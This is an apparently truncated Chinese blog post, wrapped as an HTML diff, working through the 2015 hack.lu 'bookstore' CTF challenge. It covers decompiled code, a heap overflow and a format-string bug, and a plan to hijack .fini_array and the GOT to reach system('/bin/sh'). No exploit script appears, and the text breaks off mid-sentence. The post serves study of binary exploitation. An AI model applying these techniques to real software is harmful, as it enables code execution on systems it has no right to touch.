@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content=".fini_array 劫持一、例题2015 hacklu bookstore 题目给出5个选项，要求最多申请两个order。 123456789101112131415 _____          _   _                 _          _                   _&#x2F;__   \_____  _| |_| |__   ___   ___ | | __">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记：.fini_array 劫持">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/03/07/2026-03-07-fini_array-%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
+<meta property="og:description" content=".fini_array 劫持一、例题2015 hacklu bookstore 题目给出5个选项，要求最多申请两个order。 123456789101112131415 _____          _   _                 _          _                   _&#x2F;__   \_____  _| |_| |__   ___   ___ | | __">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/heap.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack2.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack3.png">
+<meta property="article:published_time" content="2026-03-07T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-11T01:51:22.212Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="format-string">
+<meta property="article:tag" content="heap-overflow">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/heap.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2026/03/07/2026-03-07-fini_array-%E5%8A%AB%E6%8C%81/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/03/07/2026-03-07-fini_array-%E5%8A%AB%E6%8C%81/","path":"2026/03/07/2026-03-07-fini_array-劫持/","title":"学习笔记：.fini_array 劫持"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>学习笔记：.fini_array 劫持 | Whoamiuu's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Whoamiuu's Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fini-array-%E5%8A%AB%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">.fini_array 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BE%8B%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">一、例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.2.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8E%A7%E5%88%B6-dest-%E5%A0%86%E5%9D%97"><span class="nav-number">1.2.2.</span> <span class="nav-text">第一步：控制 _dest 堆块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%8A%AB%E6%8C%81-fini-array%E8%A7%A6%E5%8F%91%E5%BE%AA%E7%8E%AF"><span class="nav-number">1.2.3.</span> <span class="nav-text">第二步：劫持.fini_array触发循环</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%8A%AB%E6%8C%81GOT%E8%A7%A6%E5%8F%91system-bin-sh"><span class="nav-number">1.2.4.</span> <span class="nav-text">第三步：劫持GOT触发system(&#x2F;bin&#x2F;sh)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80-%E4%B8%8D%E5%8F%AF%E8%A1%8C-%EF%BC%9A"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">思路一(不可行)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E5%8F%AF%E8%83%BD%E5%8F%AF%E8%A1%8C-%EF%BC%9A"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">思路二(可能可行)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89-%E4%B8%8D%E5%8F%AF%E8%A1%8C-%EF%BC%9A"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">思路三(不可行)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%9B%9B-getshll-%EF%BC%9A"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">思路四(getshll)：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/03/07/2026-03-07-fini_array-%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="学习笔记：.fini_array 劫持 | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          学习笔记：.fini_array 劫持
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-07 10:00:00" itemprop="dateCreated datePublished" datetime="2026-03-07T10:00:00+08:00">2026-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-11 09:51:22" itemprop="dateModified" datetime="2026-03-11T09:51:22+08:00">2026-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="fini-array-劫持"><a href="#fini-array-劫持" class="headerlink" title=".fini_array 劫持"></a>.fini_array 劫持</h1><h2 id="一、例题"><a href="#一、例题" class="headerlink" title="一、例题"></a>一、例题</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2015_hacklu_bookstore">2015 hacklu bookstore</a></p>
+<p>题目给出5个选项，要求最多申请两个order。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> _____          _   _                 _          _                   _</span><br><span class="line">/__   \_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \</span><br><span class="line">  / /\/ _ \ \/ / __| &#x27;_ \ / _ \ / _ \| |/ / / __| __/ _ \| &#x27;__/ _ \/  /</span><br><span class="line"> / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \__ \ || (_) | | |  __/\_/</span><br><span class="line"> \/   \___/_/\_\\__|_.__/ \___/ \___/|_|\_\ |___/\__\___/|_|  \___\/</span><br><span class="line">Crappiest and most expensive books for your college education!</span><br><span class="line"></span><br><span class="line">We can order books for you in case they&#x27;re not in stock.</span><br><span class="line">Max. two orders allowed!</span><br><span class="line"></span><br><span class="line">1: Edit order 1</span><br><span class="line">2: Edit order 2</span><br><span class="line">3: Delete order 1</span><br><span class="line">4: Delete order 2</span><br><span class="line">5: Submit</span><br></pre></td></tr></table></figure>
+
+<p>来看反编译：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...省略</span><br><span class="line">  Order1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);  <span class="comment">/*第一个堆块*/</span></span><br><span class="line">  Order2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);  <span class="comment">/*第二个堆块*/</span></span><br><span class="line">  _dest = <span class="built_in">malloc</span>(<span class="number">0x80</span>);   <span class="comment">/*第三个堆块*/</span></span><br><span class="line">  <span class="keyword">if</span> (((Order1 == (<span class="type">void</span> *)<span class="number">0x0</span>) || (Order2 == (<span class="type">void</span> *)<span class="number">0x0</span>)) || (_dest == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Something failed!\n&quot;</span>,<span class="number">1</span>,<span class="number">0x12</span>,<span class="built_in">stderr</span>);</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    bVar1 = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        ...省略</span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">while</span> (!bVar1) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1: Edit order 1&quot;</span>);</span><br><span class="line">      ...</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;5: Submit&quot;</span>);</span><br><span class="line">      fgets(local_98,<span class="number">0x80</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">switch</span>(local_98[<span class="number">0</span>]) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">        edit_order(Order1);</span><br><span class="line">        <span class="built_in">strcpy</span>(_dest,<span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">        edit_order(Order2);</span><br><span class="line">        <span class="built_in">strcpy</span>(_dest,<span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        delete_order(Order1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        delete_order(Order2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        local_c0 = <span class="built_in">malloc</span>(<span class="number">0x140</span>); <span class="comment">/*第四个堆块*/</span></span><br><span class="line">        <span class="keyword">if</span> (local_c0 == (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          fwrite(<span class="string">&quot;Something failed!\n&quot;</span>,<span class="number">1</span>,<span class="number">0x12</span>,<span class="built_in">stderr</span>);</span><br><span class="line">          uVar2 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LAB_00400c98;</span><br><span class="line">        &#125;</span><br><span class="line">        concatenate(local_c0,Order1,Order2);</span><br><span class="line">        bVar1 = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,local_c0);</span><br><span class="line">    <span class="built_in">printf</span>(_dest);    <span class="comment">/*存在格式化字符串漏洞*/</span></span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00400c98:</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这个题目所有的堆块大小都是硬编码的，不存在动态分配内存。其中的edit_order选项是本题的输入函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit_order</span><span class="params">(<span class="type">long</span> param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  undefined4 local_18;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line"></span><br><span class="line">  local_18 = <span class="number">0</span>;</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">/* 换行符\n  */</span></span><br><span class="line">  <span class="keyword">while</span> (local_18 != <span class="number">10</span>) &#123;</span><br><span class="line">    local_18 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    *(<span class="type">char</span> *)(param_1 + local_14) = (<span class="type">char</span>)local_18;</span><br><span class="line">    local_14 = local_14 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* 换行符改成0 */</span></span><br><span class="line">  *(undefined1 *)(param_1 + (<span class="type">long</span>)local_14 + <span class="number">-1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数存在严重的溢出漏洞，它仅检查换行符\n(10)，并没有限制输入长度，也就是说我们可以向目标内存输入任意字节的数据，在这里就构成了堆溢出。</p>
+<p>另外一个重要的漏洞就是 printf(_dest) 处的格式化字符串漏洞，下面详细讲述漏洞利用过程。</p>
+<h2 id="二、调试"><a href="#二、调试" class="headerlink" title="二、调试"></a>二、调试</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题最终利用依然是修改GOT表项，通过free(ptr)触发system(&#x2F;bin&#x2F;sh)。checksec查看程序保护没有开启PIE和RELRO。</p>
+<p>首要目标依然是泄露libc基址来得到system真实地址。本题明显可以通过堆溢出布置 _dest块再用格式化字符串泄露地址，不过这里存在一个很大的障碍：执行完 printf( _dest)后程序会正常退出，也就是说即使泄露了地址也无法修改GOT表项。所以这里就引出了本篇的主题：.fini_array劫持。</p>
+<p>.fini_array 是一个函数指针数组，它的作用很简单：当程序通过 exit() 或 return 0 正常退出时，会依次调用这个数组里存放的所有函数指针。在正常程序中，它主要被用来执行清理工作，比如调用C++全局对象的析构函数，或者执行那些用 <code>__attribute__((destructor))</code> 标记的自定义清理函数。</p>
+<p>当然，上面这些都是后话，重要的是明白程序退出流程，程序的退出流程大致是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main 执行完毕 --&gt; 调用 exit() --&gt; 遍历执行 .fini_array 里的函数 --&gt; 真正退出</span><br></pre></td></tr></table></figure>
+
+<p>只要我们修改 .fini_array 数组里的指针为 main 函数地址，每次结束时程序又会返回执行 main，触发循环。</p>
+<p>.fini_array 数组存在于程序的 .data 段中，可以通过 readelf 看到它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S ./books | grep .fini_array</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>➜  &#x2F;ctf readelf -S books | grep .fini_array<br>  [20] .fini_array       FINI_ARRAY       0000000000  000021b8</p>
+</blockquote>
+<p>在IDA中找到对应地址。<code>Segment permissions: Read/Write</code>表示此处可读可写，是本题漏洞利用的基础。<code>dq offset sub_400830</code>表示在地址 <code>0x6011B8</code> 处，存放着一个8字节的函数指针(是<code>__do_global_dtors_aux</code> 函数，用于执行全局析构(不重要))，这个就是我们要修改的指针。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:00000000006011B8 ; ELF Termination Function Table</span><br><span class="line">.fini_array:00000000006011B8 ; ===========================================================================</span><br><span class="line">.fini_array:00000000006011B8</span><br><span class="line">.fini_array:00000000006011B8 ; Segment type: Pure data</span><br><span class="line">.fini_array:00000000006011B8 ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:00000000006011B8 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:00000000006011B8                 assume cs:_fini_array</span><br><span class="line">.fini_array:00000000006011B8                 ;org 6011B8h</span><br><span class="line">.fini_array:00000000006011B8 off_6011B8      dq offset sub_400830    ; DATA XREF: init+19↑o</span><br><span class="line">.fini_array:00000000006011B8 _fini_array     ends</span><br><span class="line">.fini_array:00000000006011B8</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>这里简单记录一下小技巧</p>
+<p>很多时候调试题目会发现，不管是反编译还是readelf都无法找到main函数(以及一些其他函数)，这是因为*程序被 strip（去符号）*了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  /ctf readelf -s books | grep main</span><br><span class="line">➜  /ctf readelf -s books</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains 16 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>这时可以用以下技巧：</p>
